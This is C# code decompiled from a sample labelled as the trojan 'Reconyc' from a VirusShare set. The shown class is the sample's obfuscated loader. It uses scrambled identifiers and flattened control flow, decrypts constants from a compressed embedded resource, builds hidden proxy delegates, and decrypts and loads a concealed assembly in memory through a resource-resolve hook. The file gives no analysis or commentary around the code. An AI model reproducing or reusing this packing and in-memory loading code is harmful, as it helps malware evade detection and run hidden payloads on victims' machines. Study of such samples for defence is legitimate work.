// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: App, Version=6.11.5.1, Culture=neutral, PublicKeyToken=null
// MVID: D376BF24-63A2-4062-8FD1-D05465F36129
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.glja-c820da99cd06e5e8e8d7140d3f3ce35a6531e572b2cf3fd2bbacd3354fbb5df0.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

internal class \u003CModule\u003E
{
  static Dictionary<uint, object> 䠌\uF1B2뭤\uE811ᴳ䠈锴㘶;
  static MemoryStream 캔醙ⶨ\u1366ﾣﴘ雀褣;
  static Assembly 漥䭣\u2242ꖺꔎᏼ\uE951\u19F0;

  static \u003CModule\u003E()
  {
    \u24AE櫥稐楍\uFFFD凁菒ᄰ.ጠ\u22EF\uF0BEﴕﵞ\u21F2︠\uE7AB();
    int num = ~---2;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_3;
        case 1:
          AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.E\uFFFD\uFFFDpۉ\u0001F\uFFFD\u0004\u0008\uFFFD\uFFFD\u001B\uFFFDf);
          num = -(--5 - 5);
          continue;
        default:
          goto label_4;
      }
    }
label_3:
    return;
label_4:;
  }

  internal static object \uFFFDWUm7\uFFFDY\u0027b\uFFFDXNCѠd(uint id)
  {
    int num1 = --5 - 2;
    bool flag;
    while (true)
    {
      switch (num1)
      {
        case 1:
          if (!flag)
          {
            num1 = ----2;
            continue;
          }
          goto label_75;
        case 2:
          num1 = -~(2 + (2 - (3 + 2)));
          continue;
        case 3:
          flag = \u003CModule\u003E.䠌\uF1B2뭤\uE811ᴳ䠈锴㘶 != null;
          num1 = -0 - ~3 - 3;
          continue;
        case 4:
          goto label_7;
        default:
          \u003CModule\u003E.䠌\uF1B2뭤\uE811ᴳ䠈锴㘶 = new Dictionary<uint, object>();
          num1 = -(2 - 14) - 8;
          continue;
      }
    }
label_7:
    \u003CModule\u003E.캔醙ⶨ\u1366ﾣﴘ雀褣 = new MemoryStream();
    DeflateStream deflateStream = new DeflateStream(Assembly.GetCallingAssembly().GetManifestResourceStream("�>9�]\u0003]`�@�%Iq��"), CompressionMode.Decompress);
    try
    {
      byte[] buffer = new byte[4096];
      int count = deflateStream.Read(buffer, 0, 4096);
label_9:
      \u003CModule\u003E.캔醙ⶨ\u1366ﾣﴘ雀褣.Write(buffer, 0, count);
      int num2 = -10 - ~(8 + 2);
      while (true)
      {
        switch (num2)
        {
          case 1:
            count = deflateStream.Read(buffer, 0, 4096);
            flag = count != 0;
            if (!flag)
            {
              num2 = -(--12 - (6 + 6));
              continue;
            }
            goto label_9;
          default:
            goto label_16;
        }
      }
    }
    finally
    {
      flag = deflateStream == null;
      if (!flag)
        deflateStream.Dispose();
    }
label_16:
    int num3 = -8 - ~59 - 9;
label_17:
    uint num4;
    while (true)
    {
      int num5;
      do
      {
        uint num6;
        uint num7;
        uint num8;
        object obj;
        byte[] bytes;
        uint num9;
        BinaryReader binaryReader;
        uint num10;
        ushort num11;
        ushort num12;
        ushort num13;
        ushort num14;
        int index;
        int num15;
        int num16;
        do
        {
          byte num17;
          int num18;
          do
          {
            switch (num3)
            {
              case 1:
                goto label_20;
              case 2:
                goto label_21;
              case 3:
                goto label_23;
              case 4:
                goto label_24;
              case 5:
                goto label_25;
              case 6:
                goto label_26;
              case 7:
              case 17:
                goto label_27;
              case 8:
                goto label_28;
              case 9:
                goto label_29;
              case 10:
                goto label_31;
              case 11:
                goto label_33;
              case 12:
                goto label_36;
              case 13:
                goto label_37;
              case 14:
                goto label_38;
              case 15:
                goto label_39;
              case 16:
                goto label_40;
              case 18:
                goto label_43;
              case 19:
                goto label_44;
              case 20:
                goto label_45;
              case 21:
                goto label_46;
              case 22:
                goto label_47;
              case 23:
                goto label_48;
              case 24:
                goto label_50;
              case 25:
                goto label_54;
              case 26:
                goto label_55;
              case 27:
                goto label_56;
              case 28:
                goto label_57;
              case 29:
                goto label_59;
              case 30:
                goto label_61;
              case 31:
                goto label_62;
              case 32:
              case 40:
                goto label_72;
              case 33:
                goto label_64;
              case 34:
                goto label_65;
              case 35:
                goto label_66;
              case 36:
                goto label_68;
              case 37:
                goto label_69;
              case 38:
                goto label_70;
              case 39:
                goto label_71;
              case 41:
                goto label_73;
              case 42:
                goto label_74;
              case 43:
                goto label_75;
              case 44:
                goto label_76;
              case 45:
                goto label_77;
              case 46:
                goto label_79;
              case 47:
                goto label_81;
              case 48:
                goto label_82;
              case 49:
                goto label_90;
              case 50:
                goto label_83;
              case 51:
                goto label_84;
              case 52:
                goto label_86;
              case 53:
                goto label_88;
              case 54:
                goto label_89;
              default:
                flag = num17 != (byte) 97;
                num18 = flag ? 1 : 0;
                num3 = ~~12 - 2;
                continue;
            }
          }
          while (num18 != 0);
          num3 = 13 + -~7 - (9 - 8) + 5;
          continue;
label_20:
          num6 = num4 ^ id;
          num3 = -(~10 - (4 - 6));
          continue;
label_21:
          if (!flag)
          {
            num3 = -(-39 - 9);
            continue;
          }
          goto label_86;
label_23:
          num3 = ~-34 - 3;
          continue;
label_24:
          num7 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
          num3 = 20 + ~(7 - 8);
          continue;
label_25:
          num3 = ~~(45 - (~9 + (9 - 8)));
          continue;
label_26:
          num8 = 1U;
          num3 = ~-54 - (7 - 8) - 5;
          continue;
label_27:
          \u003CModule\u003E.䠌\uF1B2뭤\uE811ᴳ䠈锴㘶[num6] = obj;
          num3 = 46 - -(2 - 3) - 5 - 2;
          continue;
label_28:
          obj = (object) BitConverter.ToInt64(bytes, 0);
          num3 = --11 + (6 + 9) - 9;
          continue;
label_29:
          flag = \u003CModule\u003E.䠌\uF1B2뭤\uE811ᴳ䠈锴㘶.TryGetValue(num6, out obj);
          if (!flag)
          {
            num3 = ~-58 - 4;
            continue;
          }
          goto label_81;
label_31:
          flag = num17 != (byte) 247;
          if (!flag)
          {
            obj = (object) BitConverter.ToSingle(bytes, 0);
            num3 = -(--3 - (6 + 4));
            continue;
          }
          goto label_57;
label_33:
          int num19 = 1;
label_34:
          flag = num19 != 0;
          if (!flag)
          {
            num3 = ~(-9 - (~7 + (3 + 6)) - ~4);
            continue;
          }
          goto label_89;
label_36:
          num4 -= (uint) (~((int) num7 ^ (int) num9) + 1853327151);
          num3 = ~~~-55;
          continue;
label_37:
          binaryReader = new BinaryReader((Stream) \u003CModule\u003E.캔醙ⶨ\u1366ﾣﴘ雀褣);
          num3 = -~--13;
          continue;
label_38:
          binaryReader.BaseStream.Seek((long) num6, SeekOrigin.Begin);
          num17 = binaryReader.ReadByte();
          num3 = 3 - ---34;
          continue;
label_39:
          num7 = 1613462138U;
          num3 = ~(~37 - (5 + 8));
          continue;
label_40:
          num7 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
          num3 = ~(~(4 - 9) - 48 + (2 + 7));
          continue;
label_43:
          flag = num17 != (byte) 102;
          num3 = --~-52;
          continue;
label_44:
          num3 = 4 - -33 + 7;
          continue;
label_45:
          num9 += (num4 ^ num8 - 1U) % num10;
          num3 = --(6 - (-5 - (5 - 4)));
          continue;
label_46:
          num12 = num11;
          num14 = num13;
          num3 = ~~~-23;
          continue;
label_47:
          index = 0;
          num3 = -(-17 - (7 + 8));
          continue;
label_48:
          if (num10 >= 32U)
          {
            num15 = num10 >= 48U ? 1 : 0;
            goto label_60;
          }
          else
            goto label_59;
label_50:
          int num20 = num10 >= 32U ? 1 : 0;
label_52:
          flag = num20 != 0;
          if (!flag)
          {
            num3 = ~~(11 - (2 + ~6));
            continue;
          }
          goto label_48;
label_54:
          obj = (object) BitConverter.ToDouble(bytes, 0);
          num3 = 5 - ~(7 - (-5 + (9 + 2)));
          continue;
label_55:
          num4 += (uint) (((int) num7 | (int) num9) ^ 1853327151);
          num3 = -~--2;
          continue;
label_56:
          ++index;
          num3 = 38 - --2 - ~3;
          continue;
label_57:
          flag = num17 != (byte) 66;
          num16 = flag ? 1 : 0;
          num3 = 8 - -(14 - --4);
          continue;
label_62:
          num19 = num10 >= 64U ? 1 : 0;
          goto label_34;
label_84:
          if (flag)
          {
            flag = num17 != (byte) 30;
            int num21 = flag ? 1 : 0;
            num3 = ~(~0 - 7);
            if (num21 == 0)
            {
              num3 = -~(48 - (9 - 6 - ~9));
              continue;
            }
            continue;
          }
          goto label_85;
label_86:
          if (num10 < 16U)
          {
            num20 = 1;
            goto label_52;
          }
          else
            goto label_87;
        }
        while (num16 != 0);
        num3 = ~-41 - 7;
        continue;
label_59:
        num15 = 1;
label_60:
        flag = num15 != 0;
        num3 = -(7 - 4 - (53 - 5));
        continue;
label_61:
        num3 = ~(~63 - -9);
        continue;
label_64:
        obj = (object) BitConverter.ToInt32(bytes, 0);
        num3 = 9 - (-2 - -4);
        continue;
label_65:
        num9 += num4 * num8 % 32U;
        num4 |= (uint) ((int) num7 + ~(int) num9 & 1853327151);
        num3 = ~7 - (4 + (4 - 3) - 23) + 9;
        continue;
label_66:
        uint num22;
        if (flag)
        {
          bytes[index] ^= (byte) ((num22 * (uint) num12 + (uint) num14) % 256U);
          num12 = (ushort) ((num22 * (uint) num12 + (uint) num13) % 65536U);
          num14 = (ushort) ((num22 * (uint) num14 + (uint) num11) % 65536U);
          num3 = --34 - 7;
          continue;
        }
        num3 = ~~-0;
        continue;
label_68:
        obj = (object) Encoding.UTF8.GetString(bytes);
        num3 = --5 + (5 - 3);
        continue;
label_69:
        bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
        num22 = 1853327151U ^ num6;
        num3 = --44 - ~4 - 8;
        continue;
label_70:
        num3 = ~6 - ~3 - -66 - (7 + 6) - 3;
        continue;
label_71:
        num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
        num10 = (num4 & (uint) byte.MaxValue) % 64U;
        flag = num10 < 0U || num10 >= 16U;
        num3 = ~(4 + 4) - -11;
        continue;
label_72:
        flag = index < bytes.Length;
        num3 = -(--2 - 46) - 9;
        continue;
label_73:
        num13 = (ushort) (num22 >> 16);
        num11 = (ushort) (num22 & (uint) ushort.MaxValue);
        num3 = ~~~-22;
        continue;
label_74:
        num3 = ~(-6 - -0);
        continue;
label_76:
        num3 = -(-54 - 9) - 9;
        continue;
label_77:
        if (!flag)
        {
          num7 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
          num9 -= (uint) ~((int) num4 + (int) num10) % 48U;
          num4 ^= num7 % num9 | 1853327151U;
          num3 = --50 - (8 - 6) - 6;
          continue;
        }
label_79:
        int num23 = (int) num10;
        num3 = -(-15 - ~3);
        if ((uint) num23 >= 48U)
        {
          num3 = 28 + ~~7 - (5 - 7) - 6;
          continue;
        }
        continue;
label_81:
        return obj;
label_82:
        num7 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
        num9 ^= (uint) ((int) num4 * (int) num8 + 1) % 16U;
        num3 = ~-(26 - (~7 - -7));
        continue;
label_83:
        num9 = 1628909250U;
        num3 = ~-~-8;
        continue;
label_85:
        num3 = 4 - (3 - -2 - 9);
        continue;
label_87:
        num3 = -~(~(9 - 5) - -28);
        continue;
label_88:
        num3 = 7 - ---6;
        continue;
label_89:
        ++num8;
label_90:
        flag = num8 <= 64U;
        num5 = flag ? 1 : 0;
        num3 = -~--38;
      }
      while (num5 != 0);
      num3 = 8 + (-4 - (9 + 2)) + (7 - 5) + 6;
    }
label_75:
    num4 = 2135438825U ^ (uint) new StackFrame(1).GetMethod().MetadataToken;
    num3 = -(-9 + ~5);
    goto label_17;
  }

  internal static void 涿钉止蓸䌻䮇ᩛ\uE244(RuntimeFieldHandle f)
  {
    int num1 = ~(-4 - ~-12);
    while (true)
    {
      Type[] parameterTypes;
      int index;
      ParameterInfo[] parameters;
      char[] chArray;
      bool flag;
      FieldInfo fieldFromHandle;
      ConstructorInfo con;
      DynamicMethod dynamicMethod;
      ILGenerator ilGenerator;
      int num2;
      do
      {
        switch (num1)
        {
          case 1:
            parameterTypes[index] = parameters[index].ParameterType;
            num1 = ----11;
            continue;
          case 2:
            flag = index < chArray.Length;
            if (!flag)
            {
              byte[] numArray = Convert.FromBase64String(new string(chArray));
              con = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 0) ^ 937430129 | (int) numArray[4] << 24) as ConstructorInfo;
              num1 = --17 - 9;
              continue;
            }
            goto label_21;
          case 3:
            chArray = new char[fieldFromHandle.Name.Length];
            index = 0;
            num1 = 13 - (6 - 9 - (3 - 5)) + 3 - 5;
            continue;
          case 4:
            dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
            num1 = 3 - -2 + 8;
            continue;
          case 5:
            ilGenerator.Emit(OpCodes.Ret);
            fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
            return;
          case 6:
            ++index;
            goto case 17;
          case 7:
            ilGenerator.Emit(OpCodes.Newobj, con);
            num1 = 6 - (-14 - ~(8 + 7) - (7 - 6));
            continue;
          case 8:
            parameters = con.GetParameters();
            num1 = ----10;
            continue;
          case 9:
            flag = index < parameters.Length;
            num2 = flag ? 1 : 0;
            num1 = -(--2 - (8 - 5));
            continue;
          case 10:
            goto label_15;
          case 11:
            goto label_16;
          case 12:
            goto label_17;
          case 13:
            goto label_18;
          case 14:
            goto label_19;
          case 15:
            goto label_20;
          case 16:
            goto label_21;
          case 17:
            flag = index < parameterTypes.Length;
            num1 = 7 - ~(~(3 - 9) - -5);
            continue;
          case 18:
            goto label_23;
          default:
            num1 = ~-(11 - (6 - 2 + -3));
            continue;
        }
      }
      while (num2 != 0);
      num1 = 6 + 2 - (3 - 5) - 6;
      continue;
label_15:
      parameterTypes = new Type[parameters.Length];
      num1 = ~~~-16;
      continue;
label_16:
      ++index;
      num1 = --20 + -4 - 7;
      continue;
label_17:
      num1 = 0 + 2;
      continue;
label_18:
      ilGenerator = dynamicMethod.GetILGenerator();
      index = 0;
      num1 = --15 + 2;
      continue;
label_19:
      fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
      num1 = ~(-~7 - 18) - 6;
      continue;
label_20:
      index = 0;
      num1 = 9 - ~~9;
      continue;
label_21:
      chArray[index] = (char) ((uint) (byte) fieldFromHandle.Name[index] ^ (uint) index);
      ++index;
      num1 = ~-11 - (2 + 3) - 3;
      continue;
label_23:
      if (flag)
      {
        ilGenerator.Emit(OpCodes.Ldarg_S, index);
        num1 = ~(7 + 3 - (4 + 7 + (3 + 8) - 5));
      }
      else
        num1 = 4 - -~-4;
    }
  }

  internal static void ᛑ뽹\uAA37岠\uFFFD徏寲婪(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    int num1 = -8 - (8 - 9) + 7;
    while (true)
    {
      int index;
      Type[] parameterTypes;
      ParameterInfo[] parameters;
      int num2;
      do
      {
        MethodInfo methodInfo;
        bool flag;
        byte[] numArray;
        int num3;
        do
        {
          char[] chArray;
          ILGenerator ilGenerator;
          int num4;
          do
          {
            switch (num1)
            {
              case 1:
                ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
                num1 = -(7 + 5 - ~-34);
                continue;
              case 2:
                flag = index < chArray.Length;
                num4 = flag ? 1 : 0;
                num1 = ~(-7 - (21 - (-3 + (5 + 6))));
                continue;
              case 3:
                goto label_6;
              case 4:
                goto label_9;
              case 5:
                goto label_10;
              case 6:
                goto label_12;
              case 7:
                goto label_13;
              case 8:
                goto label_14;
              case 9:
                goto label_7;
              case 10:
                goto label_17;
              case 11:
                goto label_18;
              case 12:
                goto label_19;
              case 13:
                goto label_20;
              case 14:
                goto label_21;
              case 15:
                goto label_15;
              case 16:
                goto label_22;
              case 17:
                goto label_24;
              case 18:
                goto label_25;
              case 19:
                goto label_27;
              case 20:
                goto label_28;
              case 21:
                goto label_30;
              case 22:
                goto label_31;
              case 23:
                goto label_32;
              case 24:
                goto label_33;
              case 25:
                goto label_34;
              case 26:
                goto label_35;
              case 27:
                goto label_37;
              case 28:
                goto label_38;
              default:
                chArray = new char[fieldFromHandle.Name.Length];
                num1 = 30 - 8;
                continue;
            }
          }
          while (num4 != 0);
          goto label_5;
label_15:
          return;
label_5:
          num1 = ~(-2 - -~7) - 5;
          continue;
label_6:
          ++index;
label_7:
          flag = index < parameterTypes.Length;
          if (!flag)
          {
            num1 = --(19 - (5 - -4));
            continue;
          }
          ilGenerator.Emit(OpCodes.Ldarg, index);
          num1 = ~~(7 - (3 - 6 + ~9));
          continue;
label_9:
          numArray = Convert.FromBase64String(new string(chArray));
          num1 = ~-22 + ~2 + 7;
          continue;
label_10:
          DynamicMethod dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
label_11:
          ilGenerator = dynamicMethod.GetILGenerator();
          num1 = 2 - ~~-12;
          continue;
label_12:
          num1 = -(~18 - -6);
          continue;
label_13:
          index = 0;
          num1 = ~-9 - -9;
          continue;
label_14:
          flag = !methodInfo.DeclaringType.IsInterface;
          num1 = -(-38 - (~8 - (7 - 3)) - -7);
          continue;
label_17:
          ilGenerator.Emit(((int) numArray[0] & 128) != 0 ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
          ilGenerator.Emit(OpCodes.Ret);
          fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
          num1 = ~(7 - (9 + 9 + (7 + 3) - -8));
          continue;
label_18:
          parameterTypes = new Type[parameters.Length + 1];
          parameterTypes[0] = typeof (object);
          num1 = ~~12 - 5;
          continue;
label_19:
          ++index;
          num1 = 6 - 2 - (-10 - 7) - 4;
          continue;
label_20:
          parameters = methodInfo.GetParameters();
          num1 = -~5 + 5;
          continue;
label_21:
          index = 0;
          num1 = --(-~9 - 1);
          continue;
label_22:
          flag = !methodInfo.IsStatic;
          if (!flag)
          {
            fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
            num1 = 5 - -5 - ~4;
            continue;
          }
          goto label_12;
label_24:
          flag = index < parameters.Length;
          num1 = -(-21 - (7 + 2) - -4);
          continue;
label_25:
          if (!flag)
          {
            dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, (Type) null, true);
            goto label_11;
          }
          else
            goto label_10;
label_27:
          chArray[index] = (char) ((uint) (byte) fieldFromHandle.Name[index] ^ (uint) index);
          num1 = ~3 - ~27;
          continue;
label_28:
          flag = index != 0;
          num3 = flag ? 1 : 0;
          num1 = -(~29 - ~6);
        }
        while (num3 != 0);
        num1 = -(-13 - (-3 + ~5)) - 3;
        continue;
label_30:
        num1 = 2 - (~19 - (4 - 3));
        continue;
label_31:
        index = 0;
        num1 = ~(-4 + 6 - 20 + (8 + 7));
        continue;
label_32:
        num1 = -~-(-5 - ~2);
        continue;
label_33:
        ++index;
        num1 = ~~--2;
        continue;
label_34:
        methodInfo = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 1) ^ 331002338 | ((int) numArray[0] & (int) sbyte.MaxValue) << 24) as MethodInfo;
        num1 = -(-9 - ~~5 - 2);
        continue;
label_35:
        num2 = flag ? 1 : 0;
        num1 = -(-18 - (7 - -6) - (5 - 9));
      }
      while (num2 != 0);
      num1 = -(7 - ~-16);
      continue;
label_37:
      parameterTypes[index + 1] = parameters[index].ParameterType;
      num1 = ~-(15 - ~-3);
      continue;
label_38:
      num1 = -(7 - 28 - ~5);
    }
  }

  internal static Assembly E\uFFFD\uFFFDpۉ\u0001F\uFFFD\u0004\u0008\uFFFD\uFFFD\u001B\uFFFDf(
    object sender,
    ResolveEventArgs args)
  {
    int num1 = -(-~4 - 1) + 6;
    while (true)
    {
      switch (num1)
      {
        case 1:
          goto label_3;
        case 2:
          if ((object) \u003CModule\u003E.漥䭣\u2242ꖺꔎᏼ\uE951\u19F0 == null)
          {
            num1 = ~(2 - 3 - -0);
            continue;
          }
          goto label_22;
        default:
          num1 = --~-2;
          continue;
      }
    }
label_3:
    using (BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("u\u001C�\u001F��@���\u0016���Q"), CompressionMode.Decompress)))
    {
      byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
      int num2 = 3 - (-7 - -5);
      while (true)
      {
        int index;
        byte num3;
        int num4;
        do
        {
          switch (num2)
          {
            case 1:
              num4 = index < numArray.Length ? 1 : 0;
              num2 = -(4 - 4 - (3 - 3));
              continue;
            case 2:
              ++index;
              goto case 1;
            case 3:
              goto label_12;
            case 4:
              goto label_13;
            case 5:
              goto label_14;
            case 6:
              goto label_15;
            case 7:
              goto label_19;
            default:
              numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num3);
              num3 = (byte) ((int) num3 * 72 % 256);
              num2 = ~(2 - --7) - 2;
              continue;
          }
        }
        while (num4 != 0);
        num2 = 2 - (3 - 12 - ~7);
        continue;
label_12:
        \u003CModule\u003E.漥䭣\u2242ꖺꔎᏼ\uE951\u19F0 = Assembly.Load(numArray);
        num2 = --~-7;
        continue;
label_13:
        num2 = -(-8 - -~7 - ~8);
        continue;
label_14:
        num3 = (byte) 72;
        index = 0;
        num2 = 36 - (5 + 8 + 7) - (8 + 5) - 2;
        continue;
label_15:
        Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
        num2 = ~(~11 - ~6);
      }
    }
label_19:
    int num5 = ~(-15 - (3 - 9 - (9 - 7))) - 5;
label_20:
    Assembly assembly;
    while (true)
    {
      switch (num5)
      {
        case 1:
          goto label_22;
        case 2:
          goto label_24;
        case 3:
          assembly = \u003CModule\u003E.漥䭣\u2242ꖺꔎᏼ\uE951\u19F0;
          num5 = -8 - ~(6 + 3);
          continue;
        default:
          assembly = (Assembly) null;
          num5 = 5 - (4 - 5 - (-16 - (7 - 9 + ~9)));
          continue;
      }
    }
label_24:
    return assembly;
label_22:
    int num6 = Array.IndexOf<string>(\u003CModule\u003E.漥䭣\u2242ꖺꔎᏼ\uE951\u19F0.GetManifestResourceNames(), args.Name) != -1 ? 1 : 0;
    num5 = 29 - ~~9 - (7 + 5) - 5;
    if (num6 == 0)
    {
      num5 = -(7 - -1) + 8;
      goto label_20;
    }
    else
      goto label_20;
  }
}
